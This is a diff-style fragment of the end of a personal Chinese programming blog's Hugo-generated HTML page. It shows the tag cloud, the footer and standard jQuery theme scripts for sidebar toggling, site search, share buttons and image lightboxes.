+    <a href="http://www.yuzhan.me/tags/composer" style="font-size: 12px;">composer</a>
+    
+    <a href="http://www.yuzhan.me/tags/php" style="font-size: 12px;">php</a>
+    
+    <a href="http://www.yuzhan.me/tags/sphinx" style="font-size: 12px;">sphinx</a>
+    
+    <a href="http://www.yuzhan.me/tags/tlpi" style="font-size: 12px;">tlpi</a>
+    
+    <a href="http://www.yuzhan.me/tags/vagrant" style="font-size: 12px;">vagrant</a>
+    
+    <a href="http://www.yuzhan.me/tags/xss" style="font-size: 12px;">xss</a>
+    
+    <a href="http://www.yuzhan.me/tags/%e5%ad%a6%e4%b9%a0%e7%ac%94%e8%ae%b0" style="font-size: 12px;">学习笔记</a>
+    
+    <a href="http://www.yuzhan.me/tags/%e5%be%ae%e4%bf%a1" style="font-size: 12px;">微信</a>
+    
+    <a href="http://www.yuzhan.me/tags/%e5%bf%83%e5%be%97" style="font-size: 12px;">心得</a>
+    
+    <a href="http://www.yuzhan.me/tags/%e6%95%b0%e7%bb%84" style="font-size: 12px;">数组</a>
+    
+    <a href="http://www.yuzhan.me/tags/%e6%96%87%e4%bb%b6io" style="font-size: 12px;">文件io</a>
+    
+    <a href="http://www.yuzhan.me/tags/%e6%96%87%e4%bb%b6%e6%8f%8f%e8%bf%b0%e7%ac%a6" style="font-size: 12px;">文件描述符</a>
+    
+    <a href="http://www.yuzhan.me/tags/%e6%97%a0%e9%99%90%e7%ba%a7%e5%88%86%e7%b1%bb" style="font-size: 12px;">无限级分类</a>
+    
+    <a href="http://www.yuzhan.me/tags/%e6%a1%86%e6%9e%b6%e8%ae%be%e8%ae%a1" style="font-size: 12px;">框架设计</a>
+    
+    <a href="http://www.yuzhan.me/tags/%e7%94%a8%e6%88%b7%e5%8c%b9%e9%85%8d" style="font-size: 12px;">用户匹配</a>
+    
+    <a href="http://www.yuzhan.me/tags/%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8" style="font-size: 12px;">网络安全</a>
+    
+    <a href="http://www.yuzhan.me/tags/%e8%ae%be%e8%ae%a1%e6%a8%a1%e5%bc%8f" style="font-size: 12px;">设计模式</a>
+    
+    <a href="http://www.yuzhan.me/tags/%e9%80%92%e5%bd%92" style="font-size: 12px;">递归</a>
+    
+    <a href="http://www.yuzhan.me/tags/%e9%9d%9e%e9%80%92%e5%bd%92" style="font-size: 12px;">非递归</a>
+    
+  </div>
+</div>
+
+
+
+  
+
+</aside>
+</div>
+
+  </div>
+  <footer><div id="footer" >
+  
+  <div class="line">
+    <span></span>
+    <div style='background:no-repeat url("http://www.yuzhan.me/img/author.jpg") left top;-webkit-background-size:6.875em 6.875em;-moz-background-size:6.875em 6.875em;background-size:6.875em 6.875em;' class="author" ></div>
+  </div>
+  
+  
+  <section class="info">
+    <p>程序 <br/> 人生</p>
+  </section>
+  
+  <div class="social-font clearfix">
+    
+    
+    
+    <a href="https://github.com/yuzhanwaiting" target="_blank" title="github"></a>
+    
+    
+    
+  </div>
+  <p class="copyright">Powered by <a href="http://gohugo.io" target="_blank" title="hugo">hugo</a> and Theme by <a href="https://github.com/coderzh/hugo-pacman-theme" target="_blank" title="hugo-pacman-theme">hugo-pacman-theme</a> © 2016
+    
+    <a href="http://www.yuzhan.me/" target="_blank" title="yuzhanwaiting">yuzhanwaiting</a>
+    
+  </p>
+</div>
+</footer>
+  <script src="http://www.yuzhan.me/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+done = false;
+$(document).ready(function(){
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize();
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  $('form.search').on('submit', function (event) {
+    if (false === done) {
+      event.preventDefault();
+      var orgVal = $(this).find('#search').val();
+      $(this).find('#search').val('site:http:\/\/www.yuzhan.me\/ ' + orgVal);
+      done = true;
+      $(this).submit();
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina');
+  var html = [
+  '<a href="#" class="overlay" id="qrcode"></a>',
+  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#share"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
+  '<a href="#textlogo" class="article-back-to-top" title="Top"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="QRcode"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="Weibo"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+  $('.article-share-qrcode').click(function(){
+    var imgSrc = $('#qrcode-pic').attr('data-src');
+    $('#qrcode-pic').attr('src', imgSrc);
+    $('#qrcode-pic').load(function(){
+        $('.qrcode strong').text(' ');
+    });
+  });
+});
+</script>
+
+
+<link rel="stylesheet" href="http://www.yuzhan.me/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="http://www.yuzhan.me/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+});
+</script>
+
+
+
+
+</body>
+</html>
